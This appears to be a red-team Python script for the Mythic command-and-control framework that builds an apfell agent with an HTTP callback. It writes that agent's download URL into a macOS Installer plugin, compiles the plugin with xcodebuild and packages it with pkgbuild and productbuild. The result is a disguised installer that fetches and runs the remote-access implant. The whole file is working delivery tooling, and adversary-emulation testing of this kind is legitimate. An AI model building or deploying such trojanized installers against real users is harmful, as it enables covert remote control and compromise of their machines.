import shutil, errno, os
from mythic import *
from sys import exit
from Settings.MythicSettings import *

def install_plug():
    temp = "./Templates/Installer_Plugins/"
    payload = "./Payloads/Installer_Plugins_Payload"    

    def copyanything(src, dst):
        try:
            shutil.copytree(src, dst)
            print("Copied Template Folder to '% s'" % payload)
        except OSError as error:
        	shutil.rmtree(dst)
        	shutil.copytree(src, dst)
        	print("Overwrote files '%s'" % payload)

    copyanything(temp,payload)    

    ## Create apfell payload
    async def scripting():
        mythic = Mythic(
            username=mythic_username,
            password=mythic_password,
            server_ip=mythic_server_ip,
            server_port=mythic_server_port,
            ssl=mythic_ssl,
            global_timeout=-1,
        )
        print("[+] Logging into Mythic")
        await mythic.login()
        await mythic.set_or_create_apitoken()
        # define what our payload should be
        p = Payload(
            # what payload type is it
            payload_type="apfell", 
            c2_profiles={
                "HTTP":[
                        {"name": "callback_host", "value": mythic_http_callback_host},
                        {"name": "callback_interval", "value": mythic_http_callback_interval}
                    ]
                },
            # give our payload a description if we want
            tag="Installer Pkg with Plugin",
            # if we want to only include specific commands, put them here:
            #commands=["cmd1", "cmd2", "cmd3"],
            # what do we want the payload to be called
            filename="Installer_plugin.js")
        print("[+] Creating new apfell payload")
        # create the payload and include all commands
        # if we define commands in the payload definition, then remove the all_commands=True piece
        resp = await mythic.create_payload(p, all_commands=True, wait_for_build=True)

        print("[*] Building Installer Package w/ Plugins Payload")
        payloadDownloadid = resp.response.file_id.agent_file_id
    
        templateString = "apfellAddress"
        fin = open(payload + "/SpecialDelivery/MyInstallerPane.m", "rt")
        data = fin.read()
        data = data.replace(templateString, "https://" + mythic_server_ip + ":" + mythic_server_port + "/api/v1.4/files/download/" + payloadDownloadid) # modify to point to desired location
        fin.close()
        fin = open(payload + "/SpecialDelivery/MyInstallerPane.m", "wt")
        fin.write(data)
        fin.close()

        os.system("xcodebuild -project " + payload + "/SpecialDelivery.xcodeproj")
        os.mkdir(payload + "/plugins")
        copyanything(payload + "/build/Release/SpecialDelivery.bundle", payload + "/plugins/SpecialDelivery.bundle")
        shutil.copyfile(payload + "/SpecialDelivery/InstallerSections.plist", payload + "/plugins/InstallerSections.plist")

        os.system("pkgbuild --identifier com.simple --nopayload " + payload + "/plugins/simple.pkg")
        os.system("productbuild --identifier com.simple.agent --version 1 --package  " + payload + "/plugins/simple.pkg" + " --plugins " + payload + "/plugins/ " +  payload + "/componentpackage.pkg")

    async def main():
        await scripting()
        try:
            while True:
                pending = asyncio.all_tasks()
                plist = []
                for p in pending:
                    if p._coro.__name__ != "main" and p._state == "PENDING":
                        plist.append(p)
                if len(plist) == 0:
                    exit(0)
                else:
                    await asyncio.gather(*plist)
        except KeyboardInterrupt:
            pending = asyncio.all_tasks()
            for t in pending:
                t.cancel()    

    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
